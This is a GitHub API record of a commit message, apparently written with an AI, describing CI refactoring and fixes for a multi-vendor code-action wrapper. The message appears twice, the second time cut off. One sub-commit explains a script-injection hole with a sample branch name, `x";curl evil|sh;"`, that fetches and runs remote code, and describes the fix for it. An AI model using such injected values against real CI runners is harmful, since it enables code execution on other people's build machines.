wdev/gists{/gist_id}","gravatar_id":"","html_url":"https://github.com/izzywdev","id":99821070,"login":"izzywdev","node_id":"U_kgDOBfMmDg","organizations_url":"https://api.github.com/users/izzywdev/orgs","received_events_url":"https://api.github.com/users/izzywdev/received_events","repos_url":"https://api.github.com/users/izzywdev/repos","site_admin":false,"starred_url":"https://api.github.com/users/izzywdev/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/izzywdev/subscriptions","type":"User","url":"https://api.github.com/users/izzywdev","user_view_type":"public"},"comments_url":"https://api.github.com/repos/izzywdev/FuzeKeys/commits/b67ed2204d647b91fa900ae8e45ef44da0177fff/comments","commit":{"author":{"date":"2026-08-24T22:30:14Z","email":"99821070+izzywdev@users.noreply.github.com","name":"Israel Weinberg"},"comment_count":0,"committer":{"date":"2026-08-24T22:30:14Z","email":"noreply@github.com","name":"GitHub"},"message":"refactor(ci): route claude-code-action call sites through fuze-code-action (#109)\n\n* refactor(ci): route claude-code-action call sites through fuze-code-action\n\nReplaces every `anthropics/claude-code-action@<sha>` call site in this repo with\nthe vendored `./.github/actions/fuze-code-action` wrapper, collapsing the fleet''s\npin drift (8 distinct refs for one action, including a MUTABLE `v1` tag) to a\nsingle pin inside the action.\n\nThe wrapper tries providers in order and falls through ONLY on an AVAILABILITY\nfailure — credit/quota exhausted, auth failure, rate limit, 5xx, or the provider\ncould not start. NEVER on a task failure. Retrying a genuine review finding or a\nreal build break against a second vendor would convert an honest red into a\ngreen, which is the defect this exists to remove, not introduce.\n\nVendored rather than referenced cross-repo because the action does\n`uses: ./.github/actions/llm-endpoint`, and a relative path inside a composite\naction consumed from another repository is exactly what breaks. llm-endpoint is\nvendored alongside it for the same reason.\n\nMENTION MODE: `claude.yml` passes no prompt — claude-code-action derives the task\nfrom the triggering GitHub event. codex-action and run-gemini-cli have no GitHub\nevent context at all, so with an empty prompt they cannot see the task; a rung\nthat \"succeeded\" there would report success for work nobody performed. The\nwrapper therefore DISABLES the fallover chain when no task-prompt is given, says\nso in a ::warning:: rather than skipping silently, and fails if rung 1 fails.\n\nVerified, not assumed: a checker parses this repo''s workflows BEFORE and AFTER as\nYAML and asserts every original `with:` input and every `env:` var is still\ncarried, under its mapped name or via the action''s extra-env passthrough. Zero\nlosses. The action ships 37 of its own tests (27 classify + 3 rung-gating +\n7 extra-env), all passing.\n\nCo-Authored-By: Claude Opus 5 <noreply@anthropic.com>\nClaude-Session: https://claude.ai/code/session_01GaPa3JgrVNtWrGvqQEAEqv\n\n* test(fuze-code-action): replace the gate evaluator''s eval() with a real parser\n\nSemgrep flagged python.lang.security.audit.eval-detected on the mini\nexpression evaluator in test_rung_gating.py, and it was right to: the helper\nstring-substituted context values into the `if:` text and handed the result to\neval(), so any GitHub expression syntax it did not recognise was silently\nreinterpreted under Python''s operator rules rather than rejected.\n\nReplaced with a tokenizer + recursive-descent parser over the exact subset the\naction''s gates use (&&, ||, !, ==, !=, parentheses, string literals, context\nlookups, always()). This is stricter, not merely safer: unsupported syntax and\ncontext keys the test never supplied now raise GateSyntaxError instead of\nevaluating, so an `if:` the harness cannot parse is reported as an UNCHECKED\ngate rather than silently counted as False.\n\nAdded TestEvaluator covering comparisons, && binding tighter than ||,\nparenthesised grouping, bare-operand truthiness, and that each unsupported form\nraises — the evaluator is what the invariants are measured with, so a permissive\none would pass every assertion while proving nothing about the real gates.\n\nVendored from FuzeSDLC (feat/fuze-code-action). Suppressing the finding was not\nan option: a nosemgrep comment leaves the weaker evaluator in place.\n\n* ci: clear the actionlint findings the migration brought into scope\n\nactionlint only lints workflow files a PR changes, so routing every\nclaude-code-action call site through fuze-code-action pulled several\nlong-standing findings into scope. They are real; fixing them is the job.\n\nnightly-integration.yml — two shellcheck findings (SC2129 on consecutive\n$GITHUB_ENV redirects, SC2086 on an unquoted $envf). The vendored copy was\nSTALE: FuzeSDLC''s canonical template already carries both fixes, so this\nreconciles to it byte-for-byte rather than inventing a third form. The\n`envf` fix is substantive, not style — an array keeps `--env-file <path>`\ntwo words while surviving a path containing a space.\n\nclaude.yml (fuzemerchandize, fuzeplan, fuzeservice) — script injection.\n`github.event.pull_request.head.ref` was interpolated into an inline `run:`\nwith ${{ }}, which substitutes into the shell SOURCE before bash parses it.\nA fork branch named `x\";curl evil|sh;\"` executes on the runner. Moved that\nand every sibling context read to `env:` so they arrive as data.\n\nclaude-autofix-post-prod.yml (FuzeFront) — SC2129 on three consecutive\n$GITHUB_OUTPUT redirects.\n\nVerified with actionlint 1.7.12 (the CI-pinned version) over every changed\nworkflow file in all 17 repos: clean.\n\n* fix(fuze-code-action): rung 2 had never once executed — empty passthrough killed it\n\n`codex-safety-strategy` defaulted to '''' and was forwarded verbatim as\ncodex-action''s `safety-strategy`. An empty `with:` value OVERRIDES the callee''s\nown `default:` rather than falling back to it, and codex-action declares that\ninput `default: ''drop-sudo''` and rejects an empty one outright. Every\ninvocation therefore died in codex-action''s `resolve-codex-home` step with\n\"Invalid safety strategy: .\" before Codex ran. Rung 2 — the entire reason this\naction exists — had never executed. The chain then correctly reported itself\nexhausted and failed, so the symptom looked like \"no vendor available\" rather\nthan \"the fallover is broken\".\n\n  - codex-safety-strategy: '''' -> ''drop-sudo'' (codex-action''s own default).\n  - codex-sandbox: ''read-only'' -> ''workspace-write''. Rung 2 is the fallover for\n    work rung 1 would have COMMITTED (the a2a/mcp maintainers edit and push). A\n    read-only Codex runs to completion having changed nothing and reports\n    success — a vacuous green, which is what this action exists to prevent.\n\nNew __tests__/test_passthrough_defaults.py generalises the rule: for every input\nforwarded to a third-party action, if the CALLEE declares a non-empty default,\nthis action''s own default must be non-empty or the step must be gated on\n`inputs.X != ''''`. The callee tables are recorded from the exact pinned SHAs and\nare offline on purpose; an unrecorded `uses:` fails, so a pin bump forces\nre-reading that action''s inputs instead of carrying a stale table forward.\n\nVerified by mutation: restoring `default: ''''` fails 2 assertions, and bumping\nthe codex pin fails the pin-recorded test. Run-gemini-cli''s `prompt` has the\nsame shape (callee default \"You are a helpful assistant.\") and passes only\nbecause rung 3 is gated on `inputs.task-prompt != ''''` — the test recognises\nthat gate rather than special-casing it.\n\n* fix(llm-endpoint): the docker failure diagnostic was unreachable, and a one-vendor chain needs no container\n\nSymptom: `mcp-maintain` / `a2a-maintain` failing with a bare \"Process completed\nwith exit code 125\" from the resolve step, no error title, no docker log — so\nrung 1 never started and the whole fallover chain reported itself exhausted.\nOnly the four repos carrying the multi-vendor llm-endpoint were affected; the\nrepos still on the single-vendor version route direct to Anthropic and were fine.\n\nThree fixes, in order of what they cost:\n\n1. THE DIAGNOSTIC WAS UNREACHABLE. `docker run ...; run_rc=$?` cannot work: the\n   runner invokes `shell: bash` steps with `-e` already on, and `set -uo pipefail`\n   at the top of the script does not turn it off, so a failing `docker run` aborts\n   the step before `run_rc` is ever assigned. The `if [ $run_rc -ne 0 ]` branch —\n   which prints the error title AND docker-run.log — was dead code from the day it\n   was written. Rewritten as `if docker run ...; then rc=0; else rc=$?; fi`, a\n   tested context, the one place errexit is defined not to apply. This is the same\n   trap the classify step already documents; it was not applied here.\n\n2. A SINGLE-VENDOR CHAIN NOW ROUTES DIRECT. When only anthropic has a key — the\n   actual configuration in all four repos — the old path still started a\n   runner-local LiteLLM whose model_list had one entry and whose router_settings\n   had no `fallbacks:`. That buys nothing a direct api.anthropic.com call does not,\n   and adds a docker dependency the runner may not satisfy. openai/gemini still go\n   through LiteLLM, since it is what translates them into the Anthropic shape\n   claude-code-action speaks.\n\n3. A CONTAINER THAT WILL NOT START DEGRADES INSTEAD OF KILLING THE CHAIN. If\n   anthropic is in the available chain, fall back to the direct leg — the path this\n   action used before the multi-vendor chain existed. This is a real working path,\n   not a mask: the `::warning::` states exactly what was lost (no automatic advance\n   past anthropic on a quota/auth error), so a degraded run stays distinguishable\n   from a good one. With no anthropic key there is no Anthropic-shape endpoint at\n   all, and it still fails closed.\n\nVerified by running the extracted script against stubbed docker/curl:\nanthropic-only exits 0 without invoking docker; anthropic+openai with docker\nfailing exits 0 on the degraded leg and emits the warning; openai-only with docker\nfailing exits 1 and prints the fail-closed error.\n\n* ci(claude): wire openai + gemini keys — two of three rungs were unreachable\n\n`claude.yml` passed only `anthropic-api-key` (and `litellm-key`) to\nfuze-code-action. Rungs 2 and 3 are gated on `inputs.openai-api-key != ''''` and\n`inputs.gemini-api-key != ''''`, so with those inputs absent the action reported\n\"structurally supported, skipped — no key\" and fell straight to an exhausted\nchain. A fallover chain that advertises three vendors and can only ever reach\none is the same shape of defect as a gate that passes without looking.\n\nThe secrets already exist at the org/repo level; only the wiring was missing.\nNothing here changes behaviour where a secret is genuinely unset — the rung\nstill skips with its notice, and the chain still fails closed.\n\n* fix(fuze-code-action): \"the rung declined to run\" is not a failure — third verdict\n\nRoot cause of the a2a-maintain / mcp-maintain reds on every migration PR, from\nthe job log:\n\n  Skipping action due to workflow validation: the workflow file must exist and\n  have identical content to the version on the repository''s default branch.\n\nclaude-code-action refuses to run when the pull request modifies the workflow\nfile that invokes it — which every workflow-migration PR does by construction.\nIt exits 0 and reports NO conclusion. classify.sh read an empty conclusion as\n\"action-could-not-start\", classified it availability, fell through to rungs 2\nand 3, found no keys, and failed the job.\n\nBoth halves of that were wrong. Falling through runs the other vendors on\nexactly the task the guard exists to prevent. Failing reports a break that did\nnot happen — nothing is wrong with the repo, the action, or the credentials.\n\nSo: exit code 3, `declined`. Does not fall through, does not fail. The Finish\nstep exits 0 with mode=declined and conclusion=neutral, and BOTH the rung notice\nand the finish warning state plainly that no work was performed and that\nwhatever this workflow maintains was NOT checked on this commit. A neutral run\nstays distinguishable from a run that did the job — it is not being quietly\nrecoloured green.\n\nThe distinction is keyed on the RUNNER''s own outcome for the step, threaded in\nas classify.sh''s new third argument. A rung that genuinely could not start\nreports outcome=failure (or none) and still classifies as availability and still\nfalls through; only a step the runner says SUCCEEDED can decline.\n\nTests: test_classify.sh 27 -> 34 cases, including the four that pin the\ndistinction (succeeded -> declined; failed / skipped / absent -> availability)\nand two that prove a real conclusion is never reclassified by the new argument.\ntest_rung_gating.py sweeps code \"3\" too — 72 -> 96 combinations — asserting a\ndecline never reaches rungs 2 or 3.\n\nVerified by mutation in both directions: deleting the branch fails 2 cases,\nand widening it to ignore the step outcome fails 4.\n\n* fix(governance-sync): rebase and retry — a branch that moved is not a governance failure\n\ngovernance-sync commits its reconciliation onto a LIVE PR branch, then pushed\nwith a bare `git push`. Any push the PR author makes between this job''s checkout\nand its push wins the race, and the push is rejected with\n\n    ! [rejected]  HEAD -> <branch> (fetch first)\n\nwhich failed the job. That turned an ordinary race into a red check saying\nnothing about governance. It happened three times in one afternoon during a\nfleet-wide migration; FuzeSales#64 is the recorded instance.\n\nNow: on rejection, rebase onto the branch that moved and retry, up to three\ntimes. Deliberately NOT `|| true` — if the push still cannot land, or the rebase\nconflicts, it errors and fails with a message naming the remedy. A push that\ngenuinely cannot happen is a real failure and must stay one.\n\nFuzeHub carried an older variant that ended in\n`|| echo \"::warning::commit-back push failed (token may be read-only)\"`, i.e. a\npush failure could never red anything. That is the same vacuous shape from the\nopposite side, so it is reconciled to the canonical form with the rest. If its\ntoken really is read-only, this will now surface it instead of muffling it —\nwhich is the point.\n\n* fix(fuze-code-action): unterminated quote broke classify, and NOTHING ran the tests\n\nTwo defects, and the second is why the first shipped.\n\n1. The `::warning::` I added to the rung-1 classify step wrote an apostrophe with\n   the `''\"''\"''` idiom. That is correct inside SINGLE quotes; the string was\n   DOUBLE-quoted, so the sequence closed the quote, emitted a literal `\"`, and\n   left the rest of the line opening a string that never closed. The step died on\n   a bash syntax error.\n\n   The failure mode is the interesting part: `code=3` was written to\n   $GITHUB_OUTPUT before the malformed line, so the Finish step read the right\n   value, printed \"conclusion=neutral mode=declined\" and exited 0 — while the\n   classify step''s own non-zero failed the composite. Every log line said the\n   chain resolved correctly and the job was red anyway. Confirmed against the\n   FuzeX mcp-maintain run: step 5 \"Run mcp-maintainer\" failed with `CLAUDE_CODE:\n   3` and no ::error:: anywhere in the log.\n\n2. NOTHING RAN THE TESTS. Four test files ship beside this action — the classify\n   decision table, the 96-combination rung-gating sweep, the passthrough-default\n   check, the extra-env check — and `grep -rn fuze-code-action/__tests__\n   .github/workflows/` returned nothing, in every repo. They were green on a\n   developer''s machine and never once executed by CI, so they could not fail a\n   PR and protected nothing. That is the same vacuous shape as a gate that exits\n   0 without looking, and it is why a shell-quoting bug reached 18 branches.\n\n   New `.github/workflows/gate-fuze-code-action.yml` runs all five on any PR\n   touching `.github/actions/fuze-code-action/**` or `llm-endpoint/**`.\n\nNew `__tests__/test_run_blocks_parse.py` extracts every `run:` block from both\nactions, substitutes `${{ }}` (the runner does that before bash sees it), and\n`bash -n` parses each one. Not a correctness check and not claimed to be — it\ncatches exactly this class: unterminated strings, unbalanced heredocs, unclosed\n`if`/`for`/`case`. Verified by mutation: reintroducing the shipped `''\"''\"''`\nsequence fails it with \"unexpected EOF while looking for matching `\"''\".\n\n* fix(ci): stranded on ubuntu-latest — the preflight red was never about credentials\n\nI called the a2a/mcp-maintain preflight failures a missing-credential problem and\nsaid the fix was minting secrets. That was wrong, and the evidence corrects it\ncleanly.\n\nFuzeDeploy run 32778573184, two jobs, same workflow:\n\n    mcp-maintain preflight  labels: [\"ubuntu-latest\"]  failure  3s  no runner id, no log\n    mcp-maintain            labels: [\"fuzedeploy\"]     skipped        (needs: preflight)\n\nA job that fails in three seconds with no runner assigned and no downloadable log\ndid not run and fail — it NEVER STARTED. On a private repo whose Actions budget is\nexhausted, a GitHub-hosted job is simply refused. The correlation is exact: the 13\nrepos that declare `ci.runner` are precisely the ones where every `ubuntu-latest`\njob dies this way, and the 4 that declare none (FuzeFront, FuzeKeys, FuzeX,\nFuzeAgent) are precisely the ones where preflight passes. Credentials never came\ninto it.\n\nThe trap is already documented in this repo — reusable-claude-ci-autofix.yml spells\nit out verbatim — and I read that comment this afternoon and then hard-coded\n`ubuntu-latest` in a brand-new workflow anyway.\n\nThree changes:\n\n  - a2a-maintain.yml / mcp-maintain.yml preflight -> the repo''s ci.runner. The\n    installer had rewritten the MAINTAINER job to the scale set and left the\n    preflight behind, so `needs: preflight` killed the whole workflow. a2a/mcp\n    maintenance has been dead in these repos and has been reading as a\n    credential gap the whole time.\n  - gate-fuze-code-action.yml -> the repo''s ci.runner (ubuntu-latest only where\n    no runner is declared).\n  - actions/setup-python pinned to a26af69be951a213d495a4c3e4e4022e16d87065 (v5)\n    instead of the mutable @v5 tag — flagged by Semgrep''s\n    github-actions-mutable-action-tag on FuzeKeys#109, and the SHA already in use\n    by harden-gate.yml in these same repos.\n\n* fix(gate-manifest): reconcile the vendored schema — it rejected a key the canonical allows\n\ngate-manifest failed on FuzeMerchandize#34 and FuzeFinance#35:\n\n    gate-manifest: 1 violation(s)\n      ✗ ci — Additional properties are not allowed (''note'' was unexpected)\n\nThe manifests are not wrong. FuzeSDLC''s canonical governance/repo-manifest.schema.json\ndeclares `note` on the `ci` block with a description; the VENDORED\n.fuze/repo-manifest.schema.json in these repos predates that and still sets\n`additionalProperties: false` without it. A stale MANAGED file, rejecting a field the\nsource of truth explicitly permits.\n\nReconciled from the canonical. Verified before writing: all 17 repos'' manifests\nvalidate cleanly against the canonical schema under jsonschema Draft 2020-12, so this\nturns two reds green and introduces none.\n\nScope note — measured, not assumed:\n  * 6 repos define the gate-manifest job AND ship scripts/gate_manifest.py; those are\n    the copies reconciled here.\n  * 11 repos have NEITHER the job nor the script. Consistent, so nothing is passing\n    vacuously there, and their stale schema is inert. Left alone rather than adding\n    unrelated churn to a CI-routing PR — it is rollout backlog, not a defect.\n  * FuzeHub has no vendored schema at all.\n\nThe drift itself is worth naming: every vendored copy differs from the canonical, and\nthis one only surfaced because the runner fix let the job actually execute. A MANAGED\nfile that nothing reconciles is a latent version of exactly this failure.\n\n* chore(governance): reconcile managed files to FuzeSDLC v1 [skip ci]\n\n* fix(governance-sync): a 403 is not a race — and FuzeHub could never push at all\n\nThe rebase-and-retry loop I added earlier had a real defect, and FuzeHub exposed it\nwithin the hour. From its job log:\n\n    remote: Write access to repository not granted.\n    fatal: ... The requested URL returned error: 403\n    ::notice::push rejected (attempt 1/3) — the branch moved under us; rebasing...\n    Current branch chore/fuze-code-action is up to date.\n\nThe loop retried a PERMISSION failure three times while announcing \"the branch moved\nunder us\" — with git''s own next line flatly contradicting it. A diagnostic that names\nthe wrong cause is worse than no diagnostic: it sends the reader looking for a race\nthat never happened.\n\nNow the loop reads the push output and separates the two. A 403 / \"Write access not\ngranted\" / \"Permission denied\" fails IMMEDIATELY with a message naming the actual\ncause and where to look. Only a genuine rejection is retried.\n\nAnd the underlying FuzeHub finding, which is the more serious half:\n\n  permissions:\n    contents: read  # read-only; commit-back uses the SSH deploy key via git\n                    # remote reconfiguration\n\nThere is no such reconfiguration in that file. The one `ssh-key:` present is on the\ncheckout of the FuzeSDLC canonical into .fuzesdlc-canonical — a READ of another repo,\nnot the push remote for this one. So the comment described a mechanism that does not\nexist, and the push could never succeed. Every run computed a reconciliation and threw\nit away.\n\nThat was invisible for as long as the old `|| echo \"::warning::commit-back push failed\n(token may be read-only)\"` stood: a push failure could not fail anything, so FuzeHub''s\ngovernance reconciliation has silently not been landing. Removing the soft-fail is what\nsurfaced it, which was the stated reason for removing it.\n\nSet to `contents: write`, matching the canonical, and the false comment replaced with\nthe record of what actually happened.\n\n---------\n\nCo-authored-by: Claude <noreply@anthropic.com>\nCo-authored-by: github-actions[bot] <41898282+github-actions[bot]@users.noreply.github.com>","tree":{"sha":"bef1905be74ad65d7cf424edaca23eaa6fb983e9","url":"https://api.github.com/repos/izzywdev/FuzeKeys/git/trees/bef1905be74ad65d7cf424edaca23eaa6fb983e9"},"url":"https://api.github.com/repos/izzywdev/FuzeKeys/git/commits/b67ed2204d647b91fa900ae8e45ef44da0177fff","verification":{"payload":"tree bef1905be74ad65d7cf424edaca23eaa6fb983e9\nparent 4ca70f4f92322f3e4bf4c7e629256c0beb789520\nauthor Israel Weinberg <99821070+izzywdev@users.noreply.github.com> 1787610614 +0300\ncommitter GitHub <noreply@github.com> 1787610614 +0300\n\nrefactor(ci): route claude-code-action call sites through fuze-code-action (#109)\n\n* refactor(ci): route claude-code-action call sites through fuze-code-action\n\nReplaces every `anthropics/claude-code-action@<sha>` call site in this repo with\nthe vendored `./.github/actions/fuze-code-action` wrapper, collapsing the fleet''s\npin drift (8 distinct refs for one action, including a MUTABLE `v1` tag) to a\nsingle pin inside the action.\n\nThe wrapper tries providers in order and falls through ONLY on an AVAILABILITY\nfailure — credit/quota exhausted, auth failure, rate limit, 5xx, or the provider\ncould not start. NEVER on a task failure. Retrying a genuine review finding or a\nreal build break against a second vendor would convert an honest red into a\ngreen, which is the defect this exists to remove, not introduce.\n\nVendored rather than referenced cross-repo because the action does\n`uses: ./.github/actions/llm-endpoint`, and a relative path inside a composite\naction consumed from another repository is exactly what breaks. llm-endpoint is\nvendored alongside it for the same reason.\n\nMENTION MODE: `claude.yml` passes no prompt — claude-code-action derives the task\nfrom the triggering GitHub event. codex-action and run-gemini-cli have no GitHub\nevent context at all, so with an empty prompt they cannot see the task; a rung\nthat \"succeeded\" there would report success for work nobody performed. The\nwrapper therefore DISABLES the fallover chain when no task-prompt is given, says\nso in a ::warning:: rather than skipping silently, and fails if rung 1 fails.\n\nVerified, not assumed: a checker parses this repo''s workflows BEFORE and AFTER as\nYAML and asserts every original `with:` input and every `env:` var is still\ncarried, under its mapped name or via the action''s extra-env passthrough. Zero\nlosses. The action ships 37 of its own tests (27 classify + 3 rung-gating +\n7 extra-env), all passing.\n\nCo-Authored-By: Claude Opus 5 <noreply@anthropic.com>\nClaude-Session: https://claude.ai/code/session_01GaPa3JgrVNtWrGvqQEAEqv\n\n* test(fuze-code-action): replace the gate evaluator''s eval() with a real parser\n\nSemgrep flagged python.lang.security.audit.eval-detected on the mini\nexpression evaluator in test_rung_gating.py, and it was right to: the helper\nstring-substituted context values into the `if:` text and handed the result to\neval(), so any GitHub expression syntax it did not recognise was silently\nreinterpreted under Python''s operator rules rather than rejected.\n\nReplaced with a tokenizer + recursive-descent parser over the exact subset the\naction''s gates use (&&, ||, !, ==, !=, parentheses, string literals, context\nlookups, always()). This is stricter, not merely safer: unsupported syntax and\ncontext keys the test never supplied now raise GateSyntaxError instead of\nevaluating, so an `if:` the harness cannot parse is reported as an UNCHECKED\ngate rather than silently counted as False.\n\nAdded TestEvaluator covering comparisons, && binding tighter than ||,\nparenthesised grouping, bare-operand truthiness, and that each unsupported form\nraises — the evaluator is what the invariants are measured with, so a permissive\none would pass every assertion while proving nothing about the real gates.\n\nVendored from FuzeSDLC (feat/fuze-code-action). Suppressing the finding was not\nan option: a nosemgrep comment leaves the weaker evaluator in place.\n\n* ci: clear the actionlint findings the migration brought into scope\n\nactionlint only lints workflow files a PR changes, so routing every\nclaude-code-action call site through fuze-code-action pulled several\nlong-standing findings into scope. They are real; fixing them is the job.\n\nnightly-integration.yml — two shellcheck findings (SC2129 on consecutive\n$GITHUB_ENV redirects, SC2086 on an unquoted $envf). The vendored copy was\nSTALE: FuzeSDLC''s canonical template already carries both fixes, so this\nreconciles to it byte-for-byte rather than inventing a third form. The\n`envf` fix is substantive, not style — an array keeps `--env-file <path>`\ntwo words while surviving a path containing a space.\n\nclaude.yml (fuzemerchandize, fuzeplan, fuzeservice) — script injection.\n`github.event.pull_request.head.ref` was interpolated into an inline `run:`\nwith ${{ }}, which substitutes into the shell SOURCE before bash parses it.\nA fork branch named `x\";curl evil|sh;\"` executes on the runner. Moved that\nand every sibling context read to `env:` so they arrive as data.\n\nclaude-autofix-post-prod.yml (FuzeFront) — SC2129 on three consecutive\n$GITHUB_OUTPUT redirects.\n\nVerified with actionlint 1.7.12 (the CI-pinned version) over every changed\nworkflow file in all 17 repos: clean.\n\n* fix(fuze-code-action): rung 2 had never once executed — empty passthrough killed it\n\n`codex-safety-strategy` defaulted to '''' and was forwarded verbatim as\ncodex-action''s `safety-strategy`. An empty `with:` value OVERRIDES the callee''s\nown `default:` rather than falling back to it, and codex-action declares that\ninput `default: ''drop-sudo''` and rejects an empty one outright. Every\ninvocation therefore died in codex-action''s `resolve-codex-home` step with\n\"Invalid safety strategy: .\" before Codex ran. Rung 2 — the entire reason this\naction exists — had never executed. The chain then correctly reported itself\nexhausted and failed, so the symptom looked like \"no vendor available\" rather\nthan \"the fallover is broken\".\n\n  - codex-safety-strategy: '''' -> ''drop-sudo'' (codex-action''s own default).\n  - codex-sandbox: ''read-only'' -> ''workspace-write''. Rung 2 is the fallover for\n    work rung 1 would have COMMITTED (the a2a/mcp maintainers edit and push). A\n    read-only Codex runs to completion having changed nothing and reports\n    success — a vacuous green, which is what this action exists to prevent.\n\nNew __tests__/test_passthrough_defaults.py generalises the rule: for every input\nforwarded to a third-party action, if the CALLEE declares a non-empty default,\nthis action''s own default must be non-empty or the step must be gated on\n`inputs.X != ''''`. The callee tables are recorded from the exact pinned SHAs and\nare offline on purpose; an unrecorded `uses:` fails, so a pin bump forces\nre-reading that action''s inputs instead of carrying a stale table forward.\n\nVerified by mutation: restoring `default: ''''` fails 2 assertions, and bumping\nthe codex pin fails the pin-recorded test. Run-gemini-cli''s `prompt` has the\nsame shape (callee default \"You are a helpful assistant.\") and passes only\nbecause rung 3 is gated on `inputs.task-prompt != ''''` — the test recognises\nthat gate rather than special-casing it.\n\n* fix(llm-endpoint): the docker failure diagnostic was unreachable, and a one-vendor chain needs no container\n\nSymptom: `mcp-maintain` / `a2a-maintain` failing with a bare \"Process completed\nwith exit code 125\" from the resolve step, no error title, no docker log — so\nrung 1 never started and the whole fallover chain reported itself exhausted.\nOnly the four repos carrying the multi-vendor llm-endpoint were affected; the\nrepos still on the single-vendor version route direct to Anthropic and were fine.\n\nThree fixes, in order of what they cost:\n\n1. THE DIAGNOSTIC WAS UNREACHABLE. `docker run ...; run_rc=$?` cannot work: the\n   runner invokes `shell: bash` steps with `-e` already on, and `set -uo pipefail`\n   at the top of the script does not turn it off, so a failing `docker run` aborts\n   the step before `run_rc` is ever assigned. The `if [ $run_rc -ne 0 ]` branch —\n   which prints the error title AND docker-run.log — was dead code from the day it\n   was written. Rewritten as `if docker run ...; then rc=0; else rc=$?; fi`, a\n   tested context, the one place errexit is defined not to apply. This is the same\n   trap the classify step already documents; it was not applied here.\n\n2. A SINGLE-VENDOR CHAIN NOW ROUTES DIRECT. When only anthropic has a key — the\n   actual configuration in all four repos — the old path still started a\n   runner-local LiteLLM whose model_list had one entry and whose router_settings\n   had no `fallbacks:`. That buys nothing a direct api.anthropic.com call does not,\n   and adds a docker dependency the runner may not satisfy. openai/gemini still go\n   through LiteLLM, since it is what translates them into the Anthropic shape\n   claude-code-action speaks.\n\n3. A CONTAINER THAT WILL NOT START DEGRADES INSTEAD OF KILLING THE CHAIN. If\n   anthropic is in the available chain, fall back to the direct leg — the path this\n   action used before the multi-vendor chain existed. This is a real working path,\n   not a mask: the `::warning::` states exactly what was lost (no automatic advance\n   past anthropic on a quota/auth error), so a degraded run stays distinguishable\n   from a good one. With no anthropic key there is no Anthropic-shape endpoint at\n   all, and it still fails closed.\n\nVerified by running the extracted script against stubbed docker/curl:\nanthropic-only exits 0 without invoking docker; anthropic+openai with docker\nfailing exits 0 on the degraded leg and emits the warning; openai-only with docker\nfailing exits 1 and prints the fail-closed error.\n\n* ci(claude): wire openai + gemini keys — two of three rungs were unreachable\n\n`claude.yml` passed only `anthropic-api-key` (and `litellm-key`) to\nfuze-code-action. Rungs 2 and 3 are gated on `inputs.openai-api-key != ''''` and\n`inputs.gemini-api-key != ''''`, so with those inputs absent the action reported\n\"structurally supported, skipped — no key\" and fell straight to an exhausted\nchain. A fallover chain that advertises three vendors and can only ever reach\none is the same shape of defect as a gate that passes without looking.\n\nThe secrets already exist at the org/repo level; only the wiring was missing.\nNothing here changes behaviour where a secret is genuinely unset — the rung\nstill skips with its notice, and the chain still fails closed.\n\n* fix(fuze-code-action): \"the rung declined to run\" is not a failure — third verdict\n\nRoot cause of the a2a-maintain / mcp-maintain reds on every migration PR, from\nthe job log:\n\n  Skipping action due to workflow validation: the workflow file must exist and\n  have identical content to the version on the repository''s default branch.\n\nclaude-code-action refuses to run when the pull request modifies the workflow\nfile that invokes it — which every workflow-migration PR does by construction.\nIt exits 0 and reports NO conclusion. classify.sh read an empty conclusion as\n\"action-could-not-start\", classified it availability, fell through to rungs 2\nand 3, found no keys, and failed the job.\n\nBoth halves of that were wrong. Falling through runs the other vendors on\nexactly the task the guard exists to prevent. Failing reports a break that did\nnot happen — nothing is wrong with the repo, the action, or the credentials.\n\nSo: exit code 3, `declined`. Does not fall through, does not fail. The Finish\nstep exits 0 with mode=declined and conclusion=neutral, and BOTH the rung notice\nand the finish warning state plainly that no work was performed and that\nwhatever this workflow maintains was NOT checked on this commit. A neutral run\nstays distinguishable from a run that did the job — it is not being quietly\nrecoloured green.\n\nThe distinction is keyed on the RUNNER''s own outcome for the step, threaded in\nas classify.sh''s new third argument. A rung that genuinely could not start\nreports outcome=failure (or none) and still classifies as availability and still\nfalls through; only a step the runner says SUCCEEDED can decline.\n\nTests: test_classify.sh 27 -> 34 cases, including the four that pin the\ndistinction (succeeded -> declined; failed / skipped / absent -> availability)\nand two that prove a real conclusion is never reclassified by the new argument.\ntest_rung_gating.py sweeps code \"3\" too — 72 -> 96 combinations — asserting a\ndecline never reaches rungs 2 or 3.\n\nVerified by mutation in both directions: deleting the branch fails 2 cases,\nand widening it to ignore the step outcome fails 4.\n\n* fix(governance-sync): rebase and retry — a branch that moved is not a governance failure\n\ngovernance-sync commits its reconciliation onto a LIVE PR branch, then pushed\nwith a bare `git push`. Any push the PR author makes between this job''s checkout\nand its push wins the race, and the push is rejected with\n\n    ! [rejected]  HEAD -> <branch> (fetch first)\n\nwhich failed the job. That turned an ordinary race into a red check saying\nnothing about governance. It happened three times in one afternoon during a\nfleet-wide migration; FuzeSales#64 is the recorded instance.\n\nNow: on rejection, rebase onto the branch that moved and retry, up to three\ntimes. Deliberately NOT `|| true` — if the push still cannot land, or the rebase\nconflicts, it errors and fails with a message naming the remedy. A push that\ngenuinely cannot happen is a real failure and must stay one.\n\nFuzeHub carried an older variant that ended in\n`|| echo \"::warning::commit-back push failed (token may be read-only)\"`, i.e. a\npush failure could never red anything. That is the same vacuous shape from the\nopposite side, so it is reconciled to the canonical form with the rest. If its\ntoken really is read-only, this will now surface it instead of muffling it —\nwhich is the point.\n\n* fix(fuze-code-action): unterminated quote broke classify, and NOTHING ran the tests\n\nTwo defects, and the second is why the first shipped.\n\n1. The `::warning::` I added to the rung-1 classify step wrote an apostrophe with\n   the `''\"''\"''` idiom. That is correct inside SINGLE quotes; the string was\n   DOUBLE-quoted, so the sequence closed the quote, emitted a literal `\"`, and\n   left the rest of the line opening a string that never closed. The step died on\n   a bash syntax error.\n\n   The failure mode is the interesting part: `code=3` was written to\n   $GITHUB_OUTPUT before the malformed line, so the Finish step read the right\n   value, printed \"conclusion=neutral mode=declined\" and exited 0 — while the\n   classify step''s own non-zero failed the composite. Every log line said the\n   chain resolved correctly and the job was red anyway. Confirmed against the\n   FuzeX mcp-maintain run: step 5 \"Run mcp-maintainer\" failed with `CLAUDE_CODE:\n   3` and no ::error:: anywhere in the log.\n\n2. NOTHING RAN THE TESTS. Four test files ship beside this action — the classify\n   decision table, the 96-combination rung-gating sweep, the passthrough-default\n   check, the extra-env check — and `grep -rn fuze-code-action/__tests__\n   .github/workflows/` returned nothing, in every repo. They were green on a\n   developer''s machine and never once executed by CI, so they could not fail a\n   PR and protected nothing. That is the same vacuous shape as a gate that exits\n   0 without looking, and it is why a shell-quoting bug reached 18 branches.\n\n 